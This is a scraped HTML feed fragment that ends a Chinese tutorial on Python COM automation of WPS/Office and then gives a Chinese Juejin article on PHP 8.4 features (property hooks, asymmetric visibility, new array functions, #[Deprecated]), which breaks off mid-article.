<span class="hljs-attr">app.Visible</span> = <span class="hljs-literal">True</span>  <span class="hljs-comment"># 显示界面</span>
app.Documents.Open("test.docx")  <span class="hljs-comment"># 打开文档</span>
​
<span class="hljs-comment"># 访问属性</span>
<span class="hljs-attr">version</span> = app.Version  <span class="hljs-comment"># 获取版本</span>
</code></pre>
<h4 data-id="heading-17">错误处理</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_dispatch</span>(<span class="hljs-params">app_name</span>):
    <span class="hljs-string">"""安全创建 COM 对象"""</span>
    <span class="hljs-keyword">try</span>:
        app = win32com.client.Dispatch(app_name)
        <span class="hljs-keyword">return</span> app
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"无法创建 <span class="hljs-subst">{app_name}</span>: <span class="hljs-subst">{e}</span>"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
</code></pre>
<h3 data-id="heading-18">实用技巧</h3>
<h4 data-id="heading-19">版本兼容</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 优先尝试新版，然后回退</span>
<span class="hljs-attr">wps_progids</span> = [
    <span class="hljs-string">"wps.Application"</span>,    <span class="hljs-comment"># 新版</span>
    <span class="hljs-string">"Kwps.Application"</span>,   <span class="hljs-comment"># 旧版</span>
    <span class="hljs-string">"ket.Application"</span>,    <span class="hljs-comment"># 表格专用</span>
]
​
for progid in wps_progids:
    try:
        <span class="hljs-attr">wps</span> = win32com.client.Dispatch(progid)
        break
    except:
        continue
</code></pre>
<h4 data-id="heading-20">功能检测</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_feature_support</span>(<span class="hljs-params">app</span>):
    <span class="hljs-string">"""检测应用功能支持"""</span>
    features = {
        <span class="hljs-string">"export_pdf"</span>: <span class="hljs-built_in">hasattr</span>(app, <span class="hljs-string">"ExportAsFixedFormat"</span>),
        <span class="hljs-string">"save_as"</span>: <span class="hljs-built_in">hasattr</span>(app, <span class="hljs-string">"SaveAs2"</span>),
        <span class="hljs-string">"visible"</span>: <span class="hljs-built_in">hasattr</span>(app, <span class="hljs-string">"Visible"</span>),
    }
    <span class="hljs-keyword">return</span> features
</code></pre>
<h3 data-id="heading-21">总结</h3>
<ol>
<li>COM 接口是 Windows 平台的标准化通信方式</li>
<li>WPS 的接口设计考虑了与 Office 的兼容</li>
<li>这些接口是自动化办公的基础</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2026 年 PHP 8.4 依然重要：跳到 8.5 之前你该掌握的特性]]></title>    <link>https://juejin.cn/post/7594302398686674998</link>    <guid>https://juejin.cn/post/7594302398686674998</guid>    <pubDate>2026-01-12T23:15:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594302398686674998" data-draft-id="7594322573452738603" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2026 年 PHP 8.4 依然重要：跳到 8.5 之前你该掌握的特性"/> <meta itemprop="keywords" content="后端,PHP"/> <meta itemprop="datePublished" content="2026-01-12T23:15:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="BingoGo"/> <meta itemprop="url" content="https://juejin.cn/user/993614242266077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2026 年 PHP 8.4 依然重要：跳到 8.5 之前你该掌握的特性
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/993614242266077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    BingoGo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T23:15:51.000Z" title="Mon Jan 12 2026 23:15:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">2026 年 PHP 8.4 依然重要：跳到 8.5 之前你该掌握的特性</h2>
<h3 data-id="heading-1">为什么 PHP 8.4 在 2026 年仍然相关</h3>
<p>如果你的团队计划"今年上 PHP 8.5"，很可能会先聊到 PHP 8.4——不管你愿不愿意。</p>
<p>无聊但重要的原因是：支持窗口。</p>
<p>根据官方 PHP 支持时间表，PHP 8.4（2024 年 11 月 21 日发布）仍处于活跃支持期，直到 2026 年 12 月 31 日，安全修复持续到 2028 年 12 月 31 日。</p>
<p>这让 8.4 在 2026 年初成为一个合理的基线，特别是对于从 8.2/8.3 升级、想避免"跳太远、坏太多"的团队。</p>
<p>但有意思的原因是技术层面的：PHP 8.4 悄悄重塑了日常 OOP 风格。它引入的特性减少了样板代码，让"干净的 DTO"和"安全的领域对象"更像是语言原生支持的东西：</p>
<ul>
<li>Property hooks（头条功能）</li>
<li>非对称属性可见性（读起来是 public，写起来是 private）</li>
<li>一些生活质量改进（数组、弃用工具、DOM 等）</li>
</ul>
<p>如果你在 8.4 上内化了这些，升级到 8.5 往往感觉像"添加一些好东西"，而不是"把整个 PHP 写法现代化"。</p>
<p>所以这篇文章可以当作基线知识：如果你还没上 8.4，这是你为 8.5 做准备应该知道的——但不会变成完整的升级清单。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcatchadmin.com%2Fpost%2F2026-01%2Fphp-3-biggest-strengths-2026" target="_blank" title="https://catchadmin.com/post/2026-01/php-3-biggest-strengths-2026" ref="nofollow noopener noreferrer">原文 2026 年 PHP 8.4 依然重要：跳到 8.5 之前你该掌握的特性</a></p>
<h3 data-id="heading-2">Property hooks：是什么、为什么重要、什么时候值得用</h3>
<p>Property hooks 是 PHP 8.4 引入的。</p>
<p>它让你可以直接在属性上附加 get 和/或 set 逻辑。可以理解为"访问器方法"，但不需要写：</p>
<ul>
<li><code>getFoo(): string</code></li>
<li><code>setFoo(string $foo): void</code></li>
<li>加上私有的 backing 字段</li>
<li>加上在构造函数和工厂里重复的额外不变量</li>
</ul>
<h4 data-id="heading-3">心智模型</h4>
<p>带 hook 的属性仍然是属性。你还是用正常方式读写它：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$user</span>-&gt;email = <span class="hljs-string">"  ADMIN@EXAMPLE.COM  "</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$user</span>-&gt;email;
</code></pre>
<p>但在底层，引擎把读写路由到 hook。</p>
<p>完整形式的 hook 长这样：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example</span>
</span>{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">bool</span> <span class="hljs-variable">$modified</span> = <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$foo</span> = <span class="hljs-string">'default value'</span> {
        get {
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;modified) {
                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;foo . <span class="hljs-string">' (modified)'</span>;
            }
            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;foo;
        }
        <span class="hljs-title function_ invoke__">set</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$value</span>) {
            <span class="hljs-variable language_">$this</span>-&gt;foo = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$value</span>);
            <span class="hljs-variable language_">$this</span>-&gt;modified = <span class="hljs-literal">true</span>;
        }
    }
}
</code></pre>
<p>这是手册里的示例，展示了核心思想：保留属性语法，同时获得集中化的行为。</p>
<h4 data-id="heading-4">Backed property vs virtual property（容易漏掉的部分）</h4>
<p>Property hooks 可以创建两"种"属性：</p>
<ul>
<li><strong>Backed property</strong>：在对象中有存储的内存（普通属性），hook 操作 backing value。</li>
<li><strong>Virtual property</strong>：没有 backing 存储——是派生/计算的，像伪装成 <code>$area</code> 的 <code>getArea()</code>。</li>
</ul>
<p>手册解释说，如果两个 hook 都没有用精确语法引用 <code>$this-&gt;propertyName</code>，属性就是 virtual 的，virtual 属性不占内存空间。</p>
<p>一个干净的 virtual property 示例：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Rectangle</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$h</span>,
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$w</span>,
    </span>) </span>{}
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$area</span> {
        get =&gt; <span class="hljs-variable language_">$this</span>-&gt;h * <span class="hljs-variable language_">$this</span>-&gt;w;
    }
}
<span class="hljs-variable">$r</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Rectangle</span>(<span class="hljs-number">4</span>, <span class="hljs-number">5</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$r</span>-&gt;area;     <span class="hljs-comment">// 20</span>
<span class="hljs-variable">$r</span>-&gt;area = <span class="hljs-number">30</span>;     <span class="hljs-comment">// Error: no set operation defined</span>
</code></pre>
<p>这基本上是一个计算型 getter——但读起来像属性。</p>
<h4 data-id="heading-5">最有用的实际模式</h4>
<p>专注于真正能减少 bug 和样板代码的模式。</p>
<p><strong>模式 A：在 setter 中规范化输入（trim、大小写转换等）</strong></p>
<p>经典场景：邮箱、用户名、slug。你想接受杂乱输入但存储规范化的值。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserProfile</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$email</span> {
        set =&gt; <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$value</span>));
    }
}
</code></pre>
<p>在简写形式中，表达式结果成为存储的 backing value。</p>
<p>这已经很有用了，但生产代码通常还需要验证。</p>
<p><strong>模式 B：在边界处验证不变量（尽早抛出）</strong></p>
<p>例如，强制"用户名至少 3 个字符"并规范化空格。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserProfile</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$username</span> {
        set {
            <span class="hljs-variable">$v</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$value</span>);
            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$v</span> === <span class="hljs-string">''</span>) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'Username cannot be empty.'</span>);
            }
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>) &lt; <span class="hljs-number">3</span>) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'Username is too short.'</span>);
            }
            <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$v</span>;
        }
    }
}
</code></pre>
<p>这让不变量紧挨着属性，而不是散落在控制器、请求验证器和构造函数各处。</p>
<p>PHP 迁移指南甚至展示了类似的"验证然后赋值"模式。</p>
<p><strong>模式 C：派生/virtual 的"展示"属性</strong></p>
<p>常见的 DTO 需求：暴露 fullName 但不存储它。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$first</span>,
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$last</span>,
    </span>) </span>{}
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$fullName</span> {
        get =&gt; <span class="hljs-string">"<span class="hljs-subst">{$this-&gt;first}</span> <span class="hljs-subst">{$this-&gt;last}</span>"</span>;
    }
}
</code></pre>
<p>Virtual property 最适合的场景：</p>
<ul>
<li>确定性的，</li>
<li>计算成本低，</li>
<li>你永远不想"set"它们。</li>
</ul>
<p>对于历史上滥用魔术 <code>__get()</code> 的团队，这是一个干净的基线。</p>
<p><strong>模式 D："计算一次，之后缓存"（谨慎使用）</strong></p>
<p>有时计算值很昂贵（解析、构建对象）。你可以在对象内部缓存它。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RequestContext</span>
</span>{
    <span class="hljs-keyword">private</span> ?<span class="hljs-keyword">array</span> <span class="hljs-variable">$cachedClaims</span> = <span class="hljs-literal">null</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$jwt</span>,
    </span>) </span>{}
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">array</span> <span class="hljs-variable">$claims</span> {
        get {
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;cachedClaims !== <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;cachedClaims;
            }
            <span class="hljs-comment">// 假设 parseJwt() 做签名检查、base64 解码等</span>
            <span class="hljs-variable language_">$this</span>-&gt;cachedClaims = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseJwt</span>(<span class="hljs-variable">$this</span>-&gt;jwt);
            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;cachedClaims;
        }
    }
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseJwt</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$jwt</span></span>): <span class="hljs-title">array</span>
    </span>{
        <span class="hljs-comment">// ...</span>
        <span class="hljs-keyword">return</span> [];
    }
}
</code></pre>
<p>这很方便，但也是 hook 可能变得"太魔法"的地方。如果你把重活藏在 <code>$obj-&gt;claims</code> 后面，可能会让调用者意外。只在人体工学真正超过成本时使用这个模式。</p>
<h4 data-id="heading-6">Hooks + 构造函数提升：一个微妙的坑</h4>
<p>PHP 允许在提升的属性上使用 hook，但有一个重要规则：传给构造函数的值必须匹配属性声明的类型——不管你的 set hook 可能接受什么。</p>
<p>也就是说你可以写：</p>
<ul>
<li>属性类型：<code>DateTimeInterface</code></li>
<li>set hook 接受：<code>string|DateTimeInterface</code></li>
</ul>
<p>…但如果你用提升，构造函数参数类型仍然是 <code>DateTimeInterface</code>。</p>
<p>如果你真的想"构造函数里也允许 string"，你可能需要工厂或非提升的构造函数参数。</p>
<h4 data-id="heading-7">重要限制：property hooks 不能和 readonly 一起用</h4>
<p>这对喜欢不可变对象的团队很重要。</p>
<p>手册明确说明：property hooks 与 readonly 属性不兼容。</p>
<p>所以如果你的风格是"到处都是不可变值对象"，hooks 不能替代那个。Hooks 更适合的场景是：</p>
<ul>
<li>DTO 和 request/response 对象</li>
<li>配置对象</li>
<li>内部可变但需要护栏的领域对象</li>
</ul>
<p>（下一节会讲用非对称可见性实现"半不可变 DTO"。）</p>
<h4 data-id="heading-8">另一个限制：引用和间接修改可能坑你</h4>
<p>Hooks 拦截读写，这可能与引用冲突——特别是数组元素写入：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$obj</span>-&gt;arr[<span class="hljs-string">'k'</span>] = <span class="hljs-string">'v'</span>;
</code></pre>
<p>文档警告说，获取引用或间接修改可能绕过 set hook，并概述了约束（如 <code>&amp;get</code> 行为）和允许的情况。</p>
<p>实用指南：</p>
<ul>
<li>如果调用者经常修改元素，避免在数组属性上用 hook。</li>
<li>优先用"替换整个数组"模式（<code>$obj-&gt;tags = [...$obj-&gt;tags, $newTag];</code>），这表现得像普通 set。</li>
</ul>
<h4 data-id="heading-9">什么时候不应该用 property hooks</h4>
<p>Hooks 很棒……直到它们不是。在以下情况避免：</p>
<ul>
<li>"hook body"开始做真正的编排（IO、网络调用、日志）。</li>
<li>调试变得不清晰（"为什么读这个属性会访问数据库？"）。</li>
<li>你的团队需要关键行为有显式的调用点。</li>
</ul>
<p>一个有用的规则：property hooks 最适合实现<strong>局部不变量和局部转换</strong>——真正属于属性本身的逻辑。</p>
<h3 data-id="heading-10">其他影响日常工作的 PHP 8.4 特性（挑你真正会用的）</h3>
<p>PHP 8.4 不只有 hooks。专注于以下类型的特性：</p>
<ul>
<li>减少样板代码，</li>
<li>减少 bug，</li>
<li>或让代码更容易理解。</li>
</ul>
<h4 data-id="heading-11">特性：非对称属性可见性（public 读、受限写）</h4>
<p>非对称可见性让你可以为读和写设置不同的可见性。</p>
<p>示例：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Money</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">private</span>(<span class="hljs-params">set</span>) <span class="hljs-keyword">string</span> <span class="hljs-variable">$currency</span>,
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">private</span>(<span class="hljs-params">set</span>) <span class="hljs-keyword">int</span> <span class="hljs-variable">$cents</span>,
    </span>) </span>{}
}
</code></pre>
<p>调用者可以读：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">echo</span> <span class="hljs-variable">$m</span>-&gt;cents;
</code></pre>
<p>但不能写：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$m</span>-&gt;cents = <span class="hljs-number">500</span>; <span class="hljs-comment">// Error outside the class</span>
</code></pre>
<p>迁移指南阐明了规则：第一个可见性是 get-visibility，第二个控制 set-visibility，get visibility 不能比 set visibility 更窄。</p>
<p>这对 DTO 很重要：它给你一种"大部分不可变"的风格，而不必采用完整的值对象方法。</p>
<h4 data-id="heading-12">组合非对称可见性 + property hooks</h4>
<p>这个组合经常替代经典的"私有属性 + getter + setter"。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInput</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">private</span>(set) <span class="hljs-keyword">string</span> <span class="hljs-variable">$email</span> {
        set =&gt; <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$value</span>));
    }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">private</span>(set) <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span> {
        set {
            <span class="hljs-variable">$v</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$value</span>);
            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$v</span> === <span class="hljs-string">''</span>) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'Name is required.'</span>);
            }
            <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$v</span>;
        }
    }
}
</code></pre>
<ul>
<li>读是 public（对模板、序列化器、调试友好）</li>
<li>写是受控的（对不变量友好）</li>
<li>样板代码保持低</li>
</ul>
<h4 data-id="heading-13">特性：新数组辅助函数（array_find、array_find_key、array_any、array_all）</h4>
<p>PHP 8.4 新增了数组搜索/检查函数。</p>
<p><strong>array_find 和 array_find_key</strong></p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$users</span> = [
    [<span class="hljs-string">'id'</span> =&gt; <span class="hljs-number">1</span>, <span class="hljs-string">'active'</span> =&gt; <span class="hljs-literal">false</span>],
    [<span class="hljs-string">'id'</span> =&gt; <span class="hljs-number">2</span>, <span class="hljs-string">'active'</span> =&gt; <span class="hljs-literal">true</span>],
    [<span class="hljs-string">'id'</span> =&gt; <span class="hljs-number">3</span>, <span class="hljs-string">'active'</span> =&gt; <span class="hljs-literal">false</span>],
];

<span class="hljs-variable">$first</span> = <span class="hljs-title function_ invoke__">array_find</span>(<span class="hljs-variable">$users</span>, fn (<span class="hljs-variable">$u</span>) =&gt; <span class="hljs-variable">$u</span>[<span class="hljs-string">'active'</span>] === <span class="hljs-literal">true</span>);
<span class="hljs-comment">// ['id' =&gt; 2, 'active' =&gt; true]</span>
</code></pre>
<p>如果没找到，返回 <code>null</code>——但如果<strong>值本身</strong>就是 <code>null</code>，你怎么区分"找到 null"和"没找到"？</p>
<p>你可以用 <code>array_find_key()</code> 来避免歧义（因为 key 不能是 null）。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">array_find_key</span>(<span class="hljs-variable">$users</span>, fn (<span class="hljs-variable">$u</span>) =&gt; <span class="hljs-variable">$u</span>[<span class="hljs-string">'active'</span>] === <span class="hljs-literal">true</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$key</span> === <span class="hljs-literal">null</span>) {
    <span class="hljs-comment">// 真的没找到</span>
}
<span class="hljs-variable">$firstActive</span> = <span class="hljs-variable">$users</span>[<span class="hljs-variable">$key</span>];
</code></pre>
<p><strong>array_any 和 array_all 看起来简单——直到它们消除了噪音</strong></p>
<p>例如：强制所有上传的文件都在大小限制内。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$ok</span> = <span class="hljs-title function_ invoke__">array_all</span>(<span class="hljs-variable">$files</span>, fn (<span class="hljs-variable">$f</span>) =&gt; <span class="hljs-variable">$f</span>[<span class="hljs-string">'size'</span>] &lt;= <span class="hljs-number">5_000_000</span>);
<span class="hljs-keyword">if</span> (!<span class="hljs-variable">$ok</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">'One or more files are too large.'</span>);
}
</code></pre>
<p>这替代了每个人都写得略有不同的 foreach + 标志变量。</p>
<h4 data-id="heading-14">特性：#[Deprecated] attribute 用于用户态弃用</h4>
<p>PHP 一直有内部弃用机制，但 PHP 8.4 通过 <code>#[Deprecated]</code> attribute 暴露了一个干净的用户态版本。</p>
<p>手册说：使用已弃用的功能会触发 <code>E_USER_DEPRECATED</code>。</p>
<p>示例：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">#[\Deprecated</span>(<span class="hljs-attr">message</span>: <span class="hljs-string">"Use slugify() instead"</span>, <span class="hljs-attr">since</span>: <span class="hljs-string">"2026-01"</span>)<span class="hljs-meta">]</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">make_slug</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$s</span></span>): <span class="hljs-title">string</span>
</span>{
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$s</span>));
}

